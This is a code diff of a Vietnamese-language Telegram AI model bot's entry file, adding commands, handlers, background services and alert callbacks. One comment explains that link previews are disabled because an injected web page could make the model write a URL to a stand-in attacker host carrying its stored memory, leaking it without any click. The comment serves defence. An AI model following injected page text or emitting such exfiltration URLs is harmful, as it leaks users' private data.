@@ -3,8 +3,15 @@
 import asyncio
 import logging
 
-from telegram import BotCommand
-from telegram.ext import Application, CommandHandler, MessageHandler, filters
+from telegram import BotCommand, LinkPreviewOptions
+from telegram.ext import (
+    Application,
+    CallbackQueryHandler,
+    CommandHandler,
+    Defaults,
+    MessageHandler,
+    filters,
+)
 from telegram.request import HTTPXRequest
 
 import scheduler
@@ -20,18 +27,31 @@ from ai import (
 from channels import facebook_commands, zalo_users, zoom
 from core import config, database as db, idempotency
 from handlers import (
+    callbacks,
     chat_router,
     commands,
+    daily_data_commands,
+    expense_commands,
+    document_handler,
+    feedback_commands,
     media_handler,
+    voice_handler,
     pairing_commands,
     portfolio_commands,
     provider_commands,
+    reminder_commands,
+    unsupported,
     zalo_bridge_commands,
     zalo_login,
 )
-from services import channel_chat_service
+from services import channel_chat_service, memory_service, proactive_service
+from services import morning_brief
+from services import expense_service  # noqa: F401 - đăng ký mục "expenses" của bản tin sáng
+from services import ngay_nho  # noqa: F401 - đăng ký mục "ngay_nho" của bản tin sáng
 from services import portfolio_alerts, rag_clean_service
+from services import portfolio_events, portfolio_push, price_alerts
 from services import monitor_service
+from services import owner_alerts
 from services import db_maintenance
 from services import http_client
 from services import web_reader
@@ -44,11 +64,17 @@ logger = logging.getLogger(__name__)
 COMMANDS = [
     BotCommand("start", "Bắt đầu"),
     BotCommand("help", "Xem hướng dẫn"),
+    BotCommand("huy", "Dừng câu trả lời đang chạy dở"),
+    BotCommand("sai", "Báo câu trả lời vừa rồi chưa ổn (kèm lý do)"),
     BotCommand("danhmuc", "Xem danh mục cổ phiếu"),
     BotCommand("themcp", "Thêm giao dịch mua"),
     BotCommand("capnhatcp", "Cập nhật vị thế"),
     BotCommand("bancp", "Bán bớt hoặc bán hết"),
     BotCommand("xoacp", "Xóa mã khỏi danh mục"),
+    BotCommand("lichsucp", "Sổ giao dịch cổ phiếu"),
+    BotCommand("laicp", "Lãi/lỗ đã chốt theo tháng"),
+    BotCommand("theodoi", "Danh sách theo dõi và ngưỡng giá"),
+    BotCommand("canhbaogia", "Báo khi giá chạm ngưỡng anh đặt"),
     BotCommand("zalo", "Đăng nhập hoặc xem trạng thái Zalo B"),
     BotCommand("zalologout", "Đăng xuất Zalo B"),
     BotCommand("lich", "Tra lịch âm, ngày lễ, ngày tốt, tuổi, sao hạn"),
@@ -56,17 +82,39 @@ COMMANDS = [
     BotCommand("tsh_chitiet", "Thần số học + AI diễn giải"),
     BotCommand("tuvi", "An lá số tử vi"),
     BotCommand("tuvi_chitiet", "Lá số tử vi + AI luận giải"),
+    BotCommand("kymon", "Lập bàn Kỳ Môn Độn Giáp (mặc định lúc này)"),
+    BotCommand("kymon_chitiet", "Bàn Kỳ Môn + AI luận giải việc cần xem"),
+    BotCommand("vang", "Giá vàng SJC"),
+    BotCommand("tygia", "Tỷ giá Vietcombank, đổi tiền"),
+    BotCommand("xoso", "Kết quả xổ số, dò vé"),
+    BotCommand("thoitiet", "Thời tiết; /thoitiet nha <tỉnh> đặt nơi ở"),
+    BotCommand("bantin", "Bản tin sáng cá nhân (on|off|giờ|xem)"),
+    BotCommand("nhac", "Nhắc việc: xem, đặt, huỷ, hoãn"),
+    BotCommand("ngaynho", "Ngày nhớ: giỗ, sinh nhật, kỷ niệm"),
+    BotCommand("chitieu", "Chi tiêu: tổng theo danh mục, ghi khoản"),
+    BotCommand("chitieu_xoa", "Xoá 1 khoản chi theo số #"),
     BotCommand("prompt", "Viết prompt tạo ảnh"),
     BotCommand("gia", "Tìm giá sản phẩm"),
     BotCommand("dich", "Dịch chat Nhật-Việt"),
     BotCommand("reset", "Xoá ngữ cảnh chat"),
     BotCommand("history", "Xem lịch sử"),
-    BotCommand("memory", "Xem trí nhớ dài hạn"),
-    BotCommand("forget", "Xoá trí nhớ"),
-    BotCommand("notes", "Xem ghi chú"),
+    BotCommand("memory", "Xem trí nhớ dài hạn (đánh số), on|off"),
+    BotCommand("quen", "Quên 1 mục trí nhớ (số hoặc từ khoá)"),
+    BotCommand("nho", "Nhờ em nhớ (ghim) 1 điều"),
+    BotCommand("ghim", "Ghim 1 mục trí nhớ theo số"),
+    BotCommand("boghim", "Bỏ ghim 1 mục trí nhớ"),
+    BotCommand("forget", "Xoá hết trí nhớ dài hạn"),
+    BotCommand("notes", "Xem/tìm ghi chú"),
+    BotCommand("xoaghichu", "Xoá 1 ghi chú theo số"),
+    BotCommand("xuatdulieu", "Tải file dữ liệu em đang lưu"),
+    BotCommand("xoadulieu", "Xoá trí nhớ, ghi chú, lịch sử chat"),
+    BotCommand("hoithan", "Bật/tắt em chủ động hỏi thăm việc anh kể (on|off)"),
     BotCommand("model", "Xem/đổi model"),
     BotCommand("status", "Xem provider"),
+    BotCommand("loi", "Xem lỗi gom nhóm hôm nay"),
     BotCommand("thongke", "Thống kê lượt gọi theo user/model"),
+    BotCommand("danhgia", "Đánh giá 👍/👎 câu trả lời theo provider"),
+    BotCommand("xuateval", "Xuất câu bị 👎 thành case đánh giá (YAML)"),
     BotCommand("agent", "Hỏi agent tự tra cứu nhiều bước (thử nghiệm)"),
     BotCommand("rag", "Tra cứu kiến thức trong thư mục rag/"),
     BotCommand("ragxuly", "Dọn file md OCR trong rag/ (AI thêm heading)"),
@@ -96,7 +144,7 @@ COMMANDS = [
     BotCommand("fb_check", "Kiểm tra bài Facebook đã công khai"),
     BotCommand("fb_reconcile", "Đối soát lượt đăng Facebook bị gián đoạn"),
     BotCommand("fb_boqua", "Bỏ bài Facebook chờ"),
-    BotCommand("fb_reset", "Xóa bài Facebook đã lưu, reset ID"),
+    BotCommand("fb_reset", "Xóa bài Facebook đã lưu (cần gõ kèm xacnhan)"),
     BotCommand("fb_boloc", "Thống kê bộ lọc Zalo → Facebook"),
     BotCommand("fb_loclai", "Lọc lại các bài đang chờ duyệt"),
     BotCommand("zalopair", "Cấp quyền thành viên Zalo"),
@@ -122,6 +170,11 @@ async def _post_init(app):
     monitor_service.start()
     scheduler.start(config.ALLOWED_USER_ID)
     portfolio_alerts.start(config.ALLOWED_USER_ID)
+    portfolio_events.start()
+    price_alerts.start(config.ALLOWED_USER_ID)
+    morning_brief.start()
+    memory_service.start()
+    proactive_service.start()
 
 
 async def _post_shutdown(app):
@@ -133,8 +186,13 @@ async def _post_shutdown(app):
 
     await run_step("Telegram scheduler", scheduler.stop())
     await run_step("portfolio alerts", portfolio_alerts.stop())
+    await run_step("portfolio events", portfolio_events.stop())
+    await run_step("price alerts", price_alerts.stop())
+    await run_step("morning brief", morning_brief.stop())
     await run_step("idempotency cleanup task", idempotency.stop_cleanup_task())
     await run_step("provider monitor task", monitor_service.stop())
+    await run_step("proactive follow-ups", proactive_service.stop())
+    await run_step("memory sweep", memory_service.stop())
     await run_step("chat memory tasks", channel_chat_service.stop_background_tasks())
     await run_step("ragxuly tasks", rag_clean_service.stop_background_tasks())
 
@@ -177,6 +235,12 @@ def build_application():
         Application.builder()
         .token(config.TELEGRAM_TOKEN)
         .request(request)
+        # Tắt link preview cho MỌI tin bot gửi (reply/edit/send_message, scheduler,
+        # bản tin...): Telegram tự tải URL trong tin để dựng preview mà không cần
+        # ai bấm - 1 trang độc xúi model viết https://ke-xau/?q=<trí nhớ> là rò
+        # rỉ dữ liệu "zero-click". Mọi đường gửi đều đi qua app.bot nên 1 Defaults
+        # ở đây là đủ.
+        .defaults(Defaults(link_preview_options=LinkPreviewOptions(is_disabled=True)))
         .post_init(_post_init)
         .post_shutdown(_post_shutdown)
         .build()
@@ -184,11 +248,22 @@ def build_application():
     command_handlers = [
         ("start", commands.start_cmd),
         ("help", commands.help_cmd),
+        ("huy", commands.huy_cmd),
+        ("sai", feedback_commands.sai_cmd),
+        ("danhgia", feedback_commands.danhgia_cmd),
+        ("xuateval", feedback_commands.xuateval_cmd),
         ("danhmuc", portfolio_commands.portfolio_cmd),
         ("themcp", portfolio_commands.portfolio_cmd),
         ("capnhatcp", portfolio_commands.portfolio_cmd),
         ("bancp", portfolio_commands.portfolio_cmd),
         ("xoacp", portfolio_commands.portfolio_cmd),
+        ("lichsucp", portfolio_commands.portfolio_cmd),
+        ("laicp", portfolio_commands.portfolio_cmd),
+        ("giaban", portfolio_commands.portfolio_cmd),
+        ("theodoi", portfolio_commands.portfolio_cmd),
+        ("botheodoi", portfolio_commands.portfolio_cmd),
+        ("canhbaogia", portfolio_commands.portfolio_cmd),
+        ("xoacanhbao", portfolio_commands.portfolio_cmd),
         ("zalo", zalo_login.zalo_cmd),
         ("zalologout", zalo_login.zalologout_cmd),
         ("prompt", commands.prompt_cmd),
@@ -196,11 +271,20 @@ def build_application():
         ("dich", commands.dich_cmd),
         ("reset", commands.reset_chat_cmd),
         ("history", commands.history_cmd),
-        ("memory", commands.memory_cmd),
-        ("forget", commands.forget_cmd),
-        ("notes", commands.notes_cmd),
+        ("memory", commands.memory_family_cmd),
+        ("quen", commands.memory_family_cmd),
+        ("nho", commands.memory_family_cmd),
+        ("ghim", commands.memory_family_cmd),
+        ("boghim", commands.memory_family_cmd),
+        ("forget", commands.memory_family_cmd),
+        ("notes", commands.memory_family_cmd),
+        ("xoaghichu", commands.memory_family_cmd),
+        ("xuatdulieu", commands.memory_family_cmd),
+        ("xoadulieu", commands.memory_family_cmd),
+        ("hoithan", commands.memory_family_cmd),
         ("model", provider_commands.model_cmd),
         ("status", provider_commands.status_cmd),
+        ("loi", provider_commands.loi_cmd),
         ("thongke", commands.thongke_cmd),
         ("lich", commands.lich_cmd),
         ("tsh", commands.tsh_cmd),
@@ -208,6 +292,17 @@ def build_application():
         ("ths_chitiet", commands.tsh_chitiet_cmd),
         ("tuvi", commands.tuvi_cmd),
         ("tuvi_chitiet", commands.tuvi_chitiet_cmd),
+        ("kymon", commands.kymon_cmd),
+        ("kymon_chitiet", commands.kymon_chitiet_cmd),
+        ("vang", daily_data_commands.vang_cmd),
+        ("tygia", daily_data_commands.tygia_cmd),
+        ("xoso", daily_data_commands.xoso_cmd),
+        ("thoitiet", daily_data_commands.thoitiet_cmd),
+        ("bantin", daily_data_commands.bantin_cmd),
+        ("nhac", reminder_commands.nhac_cmd),
+        ("ngaynho", reminder_commands.ngaynho_cmd),
+        ("chitieu", expense_commands.chitieu_cmd),
+        ("chitieu_xoa", expense_commands.chitieu_xoa_cmd),
         ("agent", commands.agent_cmd),
         ("rag", commands.rag_cmd),
         ("ragxuly", commands.ragxuly_cmd),
@@ -251,24 +346,60 @@ def build_application():
     ]
     for name, handler in command_handlers:
         app.add_handler(CommandHandler(name, handler))
+    # Nút inline (👍/👎, thử lại, duyệt bài Facebook, cấp quyền Zalo, hoãn nhắc).
+    app.add_handler(CallbackQueryHandler(callbacks.on_callback))
+    # Thứ tự: lệnh -> nút -> vị trí -> thoại -> tài liệu -> ảnh -> chữ -> lệnh lạ -> catch-all.
+    # Vị trí -> thời tiết tại toạ độ; UpdateType.MESSAGE: bỏ qua cập nhật live location.
+    app.add_handler(
+        MessageHandler(filters.LOCATION & filters.UpdateType.MESSAGE, unsupported.location_msg)
+    )
+    app.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, voice_handler.voice_msg))
+    app.add_handler(
+        MessageHandler(
+            filters.Document.PDF
+            | filters.Document.TXT
+            | filters.Document.DOCX
+            | filters.Document.FileExtension("md"),
+            document_handler.document_msg,
+        )
+    )
     app.add_handler(MessageHandler(filters.PHOTO, media_handler.photo_msg))
     app.add_handler(MessageHandler(filters.Document.IMAGE, media_handler.photo_msg))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, chat_router.chat_msg))
     app.add_handler(MessageHandler(filters.COMMAND, commands.unknown_cmd))
+    # Đăng ký CUỐI: tin loại chưa hỗ trợ (sticker, video, file lạ...) nhận 1 câu giọng
+    # Lan Anh thay vì im lặng; tin dịch vụ (vào nhóm, ghim...) và tin sửa bị bỏ qua.
+    app.add_handler(
+        MessageHandler(
+            filters.UpdateType.MESSAGE & ~filters.COMMAND & ~filters.StatusUpdate.ALL,
+            unsupported.unsupported_msg,
+        )
+    )
     app.add_error_handler(commands.error_handler)
 
-    async def alert(text):
-        try:
-            await app.bot.send_message(chat_id=config.ALLOWED_USER_ID, text=text)
-        except Exception:
-            logger.warning("Không gửi được cảnh báo.", exc_info=True)
+    async def send_telegram_alert(text):
+        await app.bot.send_message(chat_id=config.ALLOWED_USER_ID, text=text)
 
+    # Telegram trước, Zoom dự phòng/nhân bản (ALERT_ZOOM_MIRROR) - xem services/owner_alerts.py.
+    alert = owner_alerts.make_alert_callback(send_telegram_alert)
     orchestrator.set_alert_callback(alert)
     zalo_users.set_alert_callback(alert)
 
-    async def notify_facebook_admins(text):
+    async def send_with_buttons(uid, text, buttons):
+        await tg_format.send_rich(app.bot, uid, text, reply_markup=callbacks.markup(buttons))
+
+    async def zalo_pair_prompt(text, buttons):
+        # Cảnh báo người Zalo lạ kèm nút cấp quyền; Zoom vẫn nhận bản chữ (nhân bản).
+        await send_with_buttons(config.ALLOWED_USER_ID, text, buttons)
+        await owner_alerts.mirror_to_zoom(text)
+
+    zalo_users.set_pair_prompt_callback(zalo_pair_prompt)
+
+    async def notify_facebook_admins(text, buttons=None):
         try:
-            await tg_format.send_rich(app.bot, config.ALLOWED_USER_ID, text)
+            await tg_format.send_rich(
+                app.bot, config.ALLOWED_USER_ID, text, reply_markup=callbacks.markup(buttons)
+            )
         except Exception:
             logger.warning("Không gửi được preview Facebook tới Telegram owner.", exc_info=True)
 
@@ -282,6 +413,7 @@ def build_application():
             logger.warning("Không gửi được preview Facebook tới Zoom admin.", exc_info=True)
 
     facebook_commands.set_admin_notification_callback(notify_facebook_admins)
+    facebook_commands.set_admin_buttons_callback(notify_facebook_admins)
     db_maintenance.set_notifier(notify_facebook_admins)
 
     async def notify(uid, text):
@@ -292,5 +424,17 @@ def build_application():
             raise
 
     scheduler.set_notify_callback(notify)
+
+    async def notify_reminder(uid, text, buttons):
+        try:
+            await send_with_buttons(uid, text, buttons)
+        except Exception:
+            logger.warning("Không gửi được tin nhắc kèm nút.", exc_info=True)
+            raise
+
+    scheduler.set_reminder_notify_callback(notify_reminder)
     portfolio_alerts.set_notify_callback(notify)
+    portfolio_push.set_notify_callback(notify)
+    morning_brief.set_notify_callback(notify)
+    proactive_service.set_notify_callback(notify)
     return app
